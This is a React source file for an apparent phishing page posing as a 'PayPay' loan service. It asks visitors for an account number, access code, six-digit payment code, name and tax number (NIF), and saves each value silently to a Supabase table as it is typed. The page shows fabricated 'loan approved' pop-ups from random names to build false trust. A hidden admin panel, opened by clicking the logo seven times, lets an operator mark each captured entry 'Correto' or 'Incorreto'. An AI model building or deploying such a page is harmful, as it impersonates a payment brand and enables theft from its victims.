import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Globe, HelpCircle, Eye, EyeOff, ShieldCheck, Info, Search, Loader2, XCircle, LayoutDashboard, History, Trash2, RotateCcw, Download } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import logoPaypay from "@/assets/logo-paypay.png";
import userIconAsset from "@/assets/chat-logo.png";
import successIconAsset from "@/assets/success-icon.jpg.asset.json";
import { verifyAdminPassword, updateApplicationStatus, getApplications, checkApplicationStatus } from "@/lib/admin.functions";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [{ title: "PayPay-Empréstimo Pay" }, { name: "description", content: "Empréstimo rápido e seguro." }],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "check_status";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"users" | "trash">("users");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [notification, setNotification] = useState<{ name: string; amount: number } | null>(null);
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [applications, setApplications] = useState<any[]>([]);

  const allFirstNames = ["João", "Maria", "António", "Ana", "Carlos"];
  const allSurnames = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira"];

  useEffect(() => {
    const showRandomNotification = () => {
      if (step === "admin") return;

      const randomName = `${allFirstNames[Math.floor(Math.random() * allFirstNames.length)] ?? "Utilizador"} ${allSurnames[Math.floor(Math.random() * allSurnames.length)] ?? "X"}`;
      const randomAmount = Math.round((Math.floor(Math.random() * (35000 - 2000 + 1)) + 2000) / 100) * 100;
      setNotification({ name: `${randomName.split(" ").slice(0, 2).join(" ")} X**`, amount: randomAmount });
      setTimeout(() => setNotification(null), 5000);
    };

    const interval = setInterval(showRandomNotification, 20000);
    const t = setTimeout(showRandomNotification, 3000);
    return () => { clearInterval(interval); clearTimeout(t); };
  }, [step]);

  const saveProgress = async () => {
    if (step === "home" || step === "admin" || step === "success") return;
    try {
        const { supabase } = await import("@/integrations/supabase/client");
        const payload = {
            account_number: accountNumber,
            payment_code: paymentCode.join(""),
            amount, term,
            name: personalData.name,
            nif: personalData.nif,
            status: "Candidatura recebida"
        };
        if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
        else {
            const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
            if (data) setApplicationId(data.id);
        }
    } catch (e) {}
  };

  useEffect(() => {
    if (step !== "home" && step !== "admin") {
        const timer = setTimeout(saveProgress, 300);
        return () => clearTimeout(timer);
    }
    return undefined;
  }, [step, accountNumber, paymentCode, amount, term, personalData]);

  const onUpdateStatus = async (id: string, isCorrect: boolean) => {
    try {
        await updateApplicationStatus({ data: { id, isCorrect, adminPassword } });
        toast.success("Atualizado");
        await fetchApplications();
    } catch (e) { toast.error("Erro"); }
  };

  const fetchApplications = async () => {
    try {
        const data = await getApplications({ data: { adminPassword } });
        setApplications(data as any[]);
    } catch (e) {}
  };

  useEffect(() => {
    if (logoClicks >= 7) {
        setStep("admin");
        setLogoClicks(0);
    }
    const t = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(t);
  }, [logoClicks]);

  return (
    <div className="min-h-screen bg-[#F8F9FC] p-4">
        <header className="flex justify-between items-center mb-8">
            <div 
              onClick={() => setLogoClicks(p => p + 1)}
              className="flex items-center gap-2 cursor-pointer select-none relative overflow-hidden h-8"
            >
              <img src={logoPaypay} alt="paypay" className="h-full invisible" />
              <img src={logoPaypay} alt="paypay" className="absolute inset-0 w-full h-full object-contain z-20" />
            </div>
            <button className="text-xs font-bold text-muted-foreground flex items-center gap-1"><Globe className="w-4 h-4" /> Port</button>
        </header>

        <main className="max-w-md mx-auto">
            <AnimatePresence mode="wait">
                {step === "home" && (
                    <motion.div key="home" className="text-center space-y-6">
                        <h1 className="text-2xl font-bold">Empréstimos Rápidos</h1>
                        <button onClick={() => setStep("login")} className="w-full bg-primary text-white p-4 rounded-xl">Solicitar</button>
                        <button onClick={() => setStep("check_status")} className="w-full p-4 border rounded-xl">Ver Estado</button>
                    </motion.div>
                )}
                {step === "login" && (
                    <motion.div key="login" className="space-y-4">
                        <h2 className="text-xl font-bold">Entrar</h2>
                        <input className="w-full p-4 border rounded-xl" placeholder="Conta" value={accountNumber} onChange={e => setAccountNumber(e.target.value)} />
                        <button onClick={() => setStep("step2")} className="w-full bg-primary text-white p-4 rounded-xl">Continuar</button>
                    </motion.div>
                )}
                {step === "admin" && (
                    <motion.div key="admin">
                        {!adminAuthenticated ? (
                            <div className="space-y-4">
                                <input type="password" placeholder="Senha Admin" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" onKeyDown={e => e.key === 'Enter' && setAdminAuthenticated(true)} />
                                <button onClick={() => setAdminAuthenticated(true)} className="w-full bg-primary text-white p-4">Entrar</button>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <div className="flex justify-between items-center mb-4">
                                  <h2 className="font-bold">Painel Admin</h2>
                                  <button onClick={fetchApplications}><RotateCcw className="w-4 h-4" /></button>
                                </div>
                                {applications.map(app => (
                                  <div key={app.id} className="p-4 border rounded-xl bg-white space-y-2">
                                    <p className="text-xs font-bold">{app.name} - {app.nif}</p>
                                    <p className="text-[10px] text-muted-foreground">{app.status}</p>
                                    <div className="flex gap-2">
                                      <button onClick={() => onUpdateStatus(app.id, true)} className="flex-1 bg-green-600 text-white p-2 rounded-lg text-[10px]">Correto</button>
                                      <button onClick={() => onUpdateStatus(app.id, false)} className="flex-1 bg-red-600 text-white p-2 rounded-lg text-[10px]">Incorreto</button>
                                    </div>
                                  </div>
                                ))}
                            </div>
                        )}
                    </motion.div>
                )}
                {step === "check_status" && (
                  <div className="space-y-4">
                    <h2 className="text-xl font-bold">Verificar</h2>
                    <input className="w-full p-4 border rounded-xl" placeholder="NIF" />
                    <button className="w-full bg-primary text-white p-4 rounded-xl">Consultar</button>
                    <button onClick={() => setStep("home")} className="w-full text-muted-foreground text-xs">Voltar</button>
                  </div>
                )}
            </AnimatePresence>
        </main>

        <AnimatePresence>
          {notification && (
            <motion.div
              initial={{ opacity: 0, x: 50, scale: 0.9 }}
              animate={{ opacity: 1, x: 0, scale: 1 }}
              exit={{ opacity: 0, x: 50, scale: 0.9 }}
              className="fixed top-4 right-4 z-50 bg-white border border-primary/20 shadow-xl rounded-2xl p-4 flex items-center gap-4 max-w-[280px]"
            >
              <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-primary">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-[10px] font-bold text-primary uppercase tracking-wider mb-0.5">Empréstimo Aprovado</p>
                <p className="text-xs font-bold truncate">{notification.name}</p>
                <p className="text-[10px] text-muted-foreground">Recebeu {notification.amount.toLocaleString()} Kz</p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
    </div>
  );
}
